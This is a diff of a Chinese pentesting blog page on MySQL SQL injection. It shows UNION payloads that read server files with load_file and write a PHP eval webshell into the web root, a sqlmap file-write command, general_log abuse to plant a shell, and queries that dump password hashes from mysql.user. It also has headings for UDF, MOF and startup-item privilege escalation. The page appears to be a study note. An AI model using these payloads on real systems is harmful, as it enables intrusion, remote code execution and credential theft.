 <p><strong>导出函数</strong>：<code>into outfile </code>或<code>into dumpfile</code></p>
-<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ol>
+<h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><ol>
 <li><p>应该设置<code>--secure-file-priv</code></p>
 <p>否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在<code>secure-file-priv</code>变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。</p>
 <blockquote>
@@ -413,7 +505,7 @@
 <p>读取数据库路径：<code>@@datadir</code></p>
 </li>
 </ol>
-<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><ol>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><ol>
 <li>只能读取绝对路径的网页文件 读取数据库路径：<code>@@datadir</code></li>
 <li>将绝对路径转换为16进制数时，不需要使用引号</li>
 </ol>
@@ -421,46 +513,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&#x27;C:\\inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
 
 <p><strong>然后在网页源码中查看</strong></p>
-<h3 id="文件导出（写入到文件）"><a href="#文件导出（写入到文件）" class="headerlink" title="文件导出（写入到文件）"></a>文件导出（写入到文件）</h3><ol>
+<h4 id="文件导出（写入到文件）"><a href="#文件导出（写入到文件）" class="headerlink" title="文件导出（写入到文件）"></a>文件导出（写入到文件）</h4><ol>
 <li><p>知道路径：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>采用PHPmyadmin，选择一个数据库如test，在数据库中<strong>新创建一个表aa</strong>，在aa中<strong>插入一个数据</strong><code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h3 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h3><ol>
+<h4 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h4><ol>
 <li>报错显示：一般网站出现错误的时候它会泄露出路径；</li>
 <li>遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出；</li>
 <li>漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径；</li>
 <li>平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径；</li>
 <li>爆破；</li>
-</ol>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li><p>如果是root权限：</p>
-<ol>
-<li><p>写ssh</p>
-</li>
-<li><p>写定时任务反弹shell</p>
-</li>
-<li><p>写日志</p>
-<ol>
-<li>前置条件<ul>
-<li>知道网站的绝对路径</li>
-<li>Web 文件夹宽松权限可以写入</li>
-<li>高权限数据库用户（至少宝塔创建的数据库用户无权set操作）</li>
-<li>支持堆叠注入</li>
-</ul>
-</li>
-</ol>
-<p><strong>MySQL 5.0 版本以上</strong>会创建日志文件，可以通过修改日志的全局变量来 getshell，这个姿势也被用来突破限制</p>
-</li>
-</ol>
-</li>
-<li><p>不确定：</p>
-<ol>
-<li>写webshell</li>
-</ol>
-</li>
 </ol>
 <h2 id="魔术引号及常见保护"><a href="#魔术引号及常见保护" class="headerlink" title="魔术引号及常见保护"></a>魔术引号及常见保护</h2><p>php.ini中存在<strong>magic_quotes_gpc</strong>选项，称为魔术引号，此选项打开，使用<code>GET，POST，cookie</code>所接收的<code>&#39;</code>单引号，<code>&quot;</code>双引号，<code>\</code>反斜线和<code>NULL字符</code>全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。</p>
 <ol>
@@ -472,7 +537,84 @@
 <li>自定义关键字替换</li>
 </ol>
 <p>其他绕过思路见其他文章</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="低版本注入配合读取或暴力-小于5-0版本"><a href="#低版本注入配合读取或暴力-小于5-0版本" class="headerlink" title="低版本注入配合读取或暴力 小于5.0版本"></a>低版本注入配合读取或暴力 小于5.0版本</h2><p>字典或读取，爆破</p>
+<h2 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h2><h3 id="数据库操作权限获取"><a href="#数据库操作权限获取" class="headerlink" title="数据库操作权限获取"></a>数据库操作权限获取</h3><p>提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法：</p>
+<ol>
+<li><p>弱口令爆破</p>
+</li>
+<li><p>sqlmap注入的<code>--sql-shell</code>模式</p>
+<p>进入交互界面后，通过<code>select host,user,password from mysql.user</code>这条命令，可以查询数据库的用户和密码。</p>
+</li>
+<li><p>网站的数据库配置文件中拿到明文密码信息。文件名一般都有<code>config</code></p>
+</li>
+<li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p>
+</li>
+</ol>
+<h3 id="Webshell获取"><a href="#Webshell获取" class="headerlink" title="Webshell获取"></a>Webshell获取</h3><h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><ul>
+<li><p>知道网站物理路径</p>
+</li>
+<li><p>高权限数据库用户</p>
+</li>
+<li><p><code>load_file()</code>开启 即 <code>secure_file_priv </code>无限制</p>
+<p>可以通过这个查：<code>mysql&gt; show global variables like &#39;%secure_file_priv%&#39;;</code></p>
+<table>
+<thead>
+<tr>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>&#x2F;tmp</td>
+<td>只允许在&#x2F;tmp操作</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+</li>
+<li><p>网站路径有写入权限</p>
+</li>
+</ul>
+<p><strong>操作</strong></p>
+<ol>
+<li><pre><code class="bash">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;/var/www/html/info.php&#39;;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+<h4 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h4><ul>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>Windows 系统下</li>
+<li>高权限运行 MySQL 或者 Apache</li>
+</ul>
+<p><strong>日志设置查看</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">general_log</span><br><span class="line">general_log_file</span><br><span class="line"># 自定义</span><br><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;/var/www/html/info.php&#x27;;</span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p>
+</blockquote>
+<p>注：</p>
+<ol>
+<li>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</li>
+<li>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些</li>
+</ol>
+<h2 id="系统命令执行（提权【参考国光】）"><a href="#系统命令执行（提权【参考国光】）" class="headerlink" title="系统命令执行（提权【参考国光】）"></a>系统命令执行（提权【参考<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#MSF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83">国光</a>】）</h2><h3 id="查询HASH解密"><a href="#查询HASH解密" class="headerlink" title="查询HASH解密"></a>查询HASH解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p>
+</blockquote>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h3 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h3><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><h3 id="CVE-2016-6663-x2F-6664组合拳"><a href="#CVE-2016-6663-x2F-6664组合拳" class="headerlink" title="CVE-2016-6663&#x2F;6664组合拳"></a>CVE-2016-6663&#x2F;6664组合拳</h3><h2 id="低版本注入配合读取或暴力-小于5-0版本"><a href="#低版本注入配合读取或暴力-小于5-0版本" class="headerlink" title="低版本注入配合读取或暴力 小于5.0版本"></a>低版本注入配合读取或暴力 小于5.0版本</h2><p>字典或读取，爆破</p>
 <h1 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h1><p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。</p>
 <p>面对它只能暴力猜解，没有其他办法。</p>
 <ul>
@@ -674,6 +816,10 @@
   <div class="bar-inner">
   
   <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/" title="SQL注入进阶-堆叠、二次、DNS注入、各位置注入等"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
     
     
     <li class="next">
